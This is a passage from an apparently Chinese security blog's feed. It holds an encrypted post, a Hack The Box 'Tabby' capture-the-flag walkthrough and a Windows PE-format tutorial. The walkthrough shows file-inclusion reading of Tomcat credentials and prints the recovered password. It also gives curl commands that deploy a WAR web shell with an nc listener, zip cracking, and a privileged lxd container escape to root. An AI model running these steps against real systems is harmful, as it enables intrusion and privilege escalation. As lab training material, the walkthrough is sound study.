      <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hack the box tabby</title>
      <link href="/posts/5c929347.html"/>
      <url>/posts/5c929347.html</url>
      <content type="html"><![CDATA[<p><img src="https://s1.ax1x.com/2020/07/08/UVG59A.png" alt=""></p><h2 id="入口点获取"><a href="#入口点获取" class="headerlink" title="入口点获取"></a>入口点获取</h2><p>端口扫描</p><pre><code>nmap --min-rate=10000 -A -sC 10.10.10.194</code></pre><p>扫描结果：</p><pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-07 06:23 EDTNmap scan report for 10.10.10.194Host is up (0.20s latency).Not shown: 873 closed ports, 124 filtered portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Mega Hosting8080/tcp open  http    Apache Tomcat|_http-open-proxy: Proxy might be redirecting requests|_http-title: Apache TomcatService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>80是个静态站点，8080是Tomcat，扫描目录无果，在点击某个页面的时候看见一个file参数，一开始无法访问。加入hosts即可<br><img src="https://s1.ax1x.com/2020/07/08/UVt0hQ.png" alt=""></p><p>访问之后提醒，站点曾经大量泄漏<br><img src="https://s1.ax1x.com/2020/07/08/UVtI39.png" alt=""></p><p>尝试LEFI，成功<br><img src="https://s1.ax1x.com/2020/07/08/UVNCut.png" alt=""><br>得到用户名:ash</p><p>版本发现<br><img src="https://s1.ax1x.com/2020/07/08/UVNE4g.png" alt=""></p><p>尝试访问有趣的路径</p><pre><code>/proc/self/environ/proc/self/fd/var/log/apache2/access.log/var/log/apache2/error.log</code></pre><p>并无结果</p><p>尝试读取news.php发现也不行<br><img src="https://s1.ax1x.com/2020/07/08/UVNRKI.png" alt=""></p><p>google一艘，发现一个tomcat的路径：<br><img src="https://s1.ax1x.com/2020/07/08/UVUoex.png" alt=""></p><pre><code>/usr/share/tomcat9/etc/tomcat-users.xml</code></pre><p>访问后得到想要的结果<br><img src="https://s1.ax1x.com/2020/07/08/UVUTw6.png" alt=""></p><p>登录Tomcat<br><img src="https://s1.ax1x.com/2020/07/08/UVaPk8.png" alt=""></p><h2 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h2><p>tomcat上传war getshell<br><a href="https://payloads.online/archivers/2017-08-17/2" target="_blank" rel="noopener">https://payloads.online/archivers/2017-08-17/2</a> - 渗透中tomcat部署war包Getshell</p><p>使用curl getshell</p><pre><code>curl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; -T shell.war &#39;http://10.10.10.194:8080/manager/text/deploy?path=/tests&#39; #上传war包为haqshellcurl -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; http://10.10.10.194:8080/manager/text/list #列出部署的war本机监听：nc -lvvp &lt;lport&gt; 浏览器访问：http://10.10.10.194:8080/tests</code></pre><p><img src="https://s1.ax1x.com/2020/07/08/UVaI3Q.png" alt=""></p><p>在web目录找到backup.zip,使用fcrackzip破解</p><pre><code>fcrackzip -D -p /usr/share/wordlists/rockyou.txt backup.zip</code></pre><p><img src="https://s1.ax1x.com/2020/07/08/UVdmgH.png" alt=""></p><p>尝试使用爆破出来的密码登录ssh，捞走users.txt<br><img src="https://s1.ax1x.com/2020/07/08/UVaqH0.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查看ash用户组是lxd<br><img src="https://s1.ax1x.com/2020/07/08/UVdgxJ.png" alt=""></p><p>提权参考：<a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/lxd-privilege-escalation/</a></p><p>过程：</p><pre><code>git clone  https://github.com/saghul/lxd-alpine-builder.gitcd lxd-alpine-builder./build-alpinewget http://10.10.14.207:8000/alpine-v3.12-x86_64-20200707_0941.tar.gzlxc image import ./alpine-v3.12-x86_64-20200707_0941.tar.gz --alias myimagelxc init myimage ignite -c security.privileged=truelxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=truelxc start ignitelxc exec ignite /bin/sh</code></pre><p><img src="https://s1.ax1x.com/2020/07/08/UVwniT.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/07/08/UVwwSe.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/07/08/UVwywt.png" alt=""></p><h2 id="过程的知识点"><a href="#过程的知识点" class="headerlink" title="过程的知识点"></a>过程的知识点</h2><p><img src="https://s1.ax1x.com/2020/07/08/UV0Hud.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> htb </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows PE学习</title>
      <link href="/posts/c925c057.html"/>
      <url>/posts/c925c057.html</url>
      <content type="html"><![CDATA[<h2 id="PE介绍"><a href="#PE介绍" class="headerlink" title="PE介绍"></a>PE介绍</h2><p>PE（Portable Execute）文件是Windows下可移植可执行文件的总称，常见的有DLL，EXE，OCX，SYS等，事实上，一个文件是否是PE文件与其扩展名无关。本文要说的PE文件结构，就是指的Window可移植可执行文件结构。</p><h2 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h2><p>PE文件具有较强的移植性；<br>PE结构是一种数据组织方式；<br>PE结构主要应用于windows系统；<br>具有PE结构的文件称为PE文件；<br>EXE、DLL都是PE文件；</p><ol><li>完整的PE文件主要有4个部分组成：DOS头，PE头，节表以及节数据。</li><li>DOs头部主要用于对非PE格式文件的处理，DOS时代遗留的产物，是PE文件的一个遗传；</li><li>PE头部部分用于宏观上记录文件的一些信息，，运行平台，大小，创建日期，属性等；</li><li>节表部分用于对各种类型的数据进行定义分段；</li><li>节数据不言而喻就是文件的数据部分，实际上我们编写程序的过程中就是对该部分的数据进行编写。而其他的部分则是由编译器依照我们编写的部分进行相应的填写而得到的。</li></ol><p>整个结构如下<br><img src="https://s1.ax1x.com/2020/07/05/USWiq0.png" alt=""></p><p>解析过程：DOS头-&gt;PE头-&gt;节段(包括导入表那些)-&gt;运行</p><h2 id="DOS头解析"><a href="#DOS头解析" class="headerlink" title="DOS头解析"></a>DOS头解析</h2><p>e_magic头部是固定的，用于表示这是个二进制可执行文件。</p><pre><code>IMAGE_DOS_HEADER {    WORD   e_magic;                // +0000h   -   EXE标志，“MZ”    WORD   e_cblp;                 // +0002h   -   最后（部分）页中的字节数    WORD   e_cp;                   // +0004h   -   文件中的全部和部分页数    WORD   e_crlc;                 // +0006h   -   重定位表中的指针数    WORD   e_cparhdr;              // +0008h   -   头部尺寸，以段落为单位    WORD   e_minalloc;             // +000ah   -   所需的最小附加段    WORD   e_maxalloc;             // +000ch   -   所需的最大附加段    WORD   e_ss;                   // +000eh   -   初始的SS值（相对偏移量）    WORD   e_sp;                   // +0010h   -   初始的SP值    WORD   e_csum;                 // +0012h   -   补码校验值    WORD   e_ip;                   // +0014h   -   初始的IP值    WORD   e_cs;                   // +0016h   -   初始的CS值    WORD   e_lfarlc;               // +0018h   -   重定位表的字节偏移量    WORD   e_ovno;                 // +001ah   -   覆盖号    WORD   e_res[4];               // +001ch   -   保留字00    WORD   e_oemid;                // +0024h   -   OEM标识符    WORD   e_oeminfo;              // +0026h   -   OEM信息    WORD   e_res2[10];             // +0028h   -   保留字    LONG   e_lfanew;               // +003ch   -   PE头相对于文件的偏移地址  }</code></pre><p><img src="https://s1.ax1x.com/2020/07/05/USWMs1.png" alt=""></p><ul><li>用黄色框框框住的是Dos头部，绿色框框框住的是Dos字节块；</li><li>Dos字节块大小是不固定的。</li></ul><p>Dos头：长度40h；<br>Dos块：长度不定，DOS插桩代码，是DOS下的16位程序代码，只是为了显示上面的提示数据。这段代码是编译器在程序编译过程中自动添加的。</p><p>Dos头里最重要的是e_lfanew字段，也就是Dos头最后四个字符，表示了PE头的偏移地址。<br>PE地址=Dos头部地址+偏移地址</p><p>Ps：这里的e_lfanew字段为：000000E8（在内存里要从右往左读，高位在右边，低位在左边）。<br><img src="https://s1.ax1x.com/2020/07/05/USWfLq.png" alt=""></p><p>通过计算可以得到PE头部地址<br><img src="https://s1.ax1x.com/2020/07/05/USWIoT.png" alt=""></p><h2 id="PE头解析"><a href="#PE头解析" class="headerlink" title="PE头解析"></a>PE头解析</h2><pre><code>typedef struct _IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</code></pre><p><img src="https://s1.ax1x.com/2020/07/05/USWHW4.png" alt=""></p><ul><li>50 45固定PE头标识；</li><li>Machine为014C -&gt; 处理器为x86；</li></ul><p><img src="https://s1.ax1x.com/2020/07/05/USWzTK.md.png" alt=""></p><ul><li>段数目这里为5；</li><li>段表相对偏移E0；</li><li>EXE/DLL。</li></ul><p>可选头部：<br><img src="https://s1.ax1x.com/2020/07/05/USfFld.png" alt=""></p><ul><li>0B 01 -&gt; 32位程序；</li><li>00002000 -&gt; 程序开始执行的入口地址；</li><li>ImageBase(文件映射到内存的基地址) -&gt; 00002000；</li><li>SectionAlignment(内存中段对齐地址) -&gt; 0000000A；</li><li>FileAlignment(文件中段对齐地址) -&gt; 0000000A；</li><li>MajorSubsystemVersion(所需的windows系统版本) -&gt; 0A00 -&gt; 十进制 10 （为UWP）；</li></ul><p><img src="https://s1.ax1x.com/2020/07/05/USfnk8.png" alt=""></p><ul><li>SizeOfImage(所需内存总大小) -&gt; 01171A；</li><li>SizeofHeaders(头部的总大小) -&gt; 000200</li><li>SubSystem(驱动/GUI/命令行) -&gt; 2000</li><li>NumberOfRvaAndSizes(数据目录个数) -&gt; 00000010</li></ul><p>数据目录项:</p><pre><code>IMAGE_DATA_DIRECTORY {    DWORD   VirtualAddress;                 // +0000h   -   数据的起始RVA    DWORD   Size;                           // +0004h   -   数据块的长度}</code></pre><p>ImportSva(导入表相对虚拟地址) -&gt;  00004000<br>可选头中定义了如下重要信息：</p><pre><code>* 所有含代码的节的总大小* 所有含已初始化数据的节的总大小* 所有含未初始化数据的节的大小* 程序执行入口RVA* 代码的节的起始RVA* 数据的节的起始RVA* 程序的建议装载地址* 内存中的节的对齐粒度* 文件中的节的对齐粒度* 内存中整个PE映像尺寸* 所有头＋节表的大小* 导出表* 导入表* 资源* 重定位表* 调试信息* 版权信息* 导入函数地址表</code></pre><p>这么说导入表和导出表算在可选头，emmm…<br><img src="https://s1.ax1x.com/2020/07/05/USfUtU.png" alt=""></p><p>常见的节数据:<br>.text：代码段，是在编译或汇编结束时产生的一种块，它的内容全部是指令代码。也有的编译器将该段命名为.code<br>.data：初始化的数据块，是初始化的数据块，包含那些编译时被初始化的变量、字符串<br>.idata：输入表，包含其他外来dll的函数和数据信息，也就是输入表，也有人称之为导入表。<br>.rsrc：资源数据块，包含模块的全部资源数据，如图标、菜单、位图等。<br>.reloc：重定位表，用于保存基址的重定位表。即当装在程序不能按照连接器所指定的地址装载文件时，需要对指令或已经初始化的变量进行调整，该块中也包含了调整过程中所需要的一些数据，如果装载能够正常装在则忽略此段中的数据。<br>.edata：导出表，是pe文件的输出表，以供其他模块使用，并不是每个pe文件都有此数据段，因为有的文件并不需要输出一些函数，该数据段常见于动态连接库文件中。<br>.radata：存放调试目录、说明字符串，该数据块并不常见主要是用于存放一些调试信息。</p><h2 id="更方便的手动查找"><a href="#更方便的手动查找" class="headerlink" title="更方便的手动查找"></a>更方便的手动查找</h2><p>利用010 Editor的模板<br>参考链接： <a href="https://bbs.pediy.com/thread-221766.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-221766.htm</a><br>官方模板链接：<a href="http://www.sweetscape.com/010editor/repository/templates/" target="_blank" 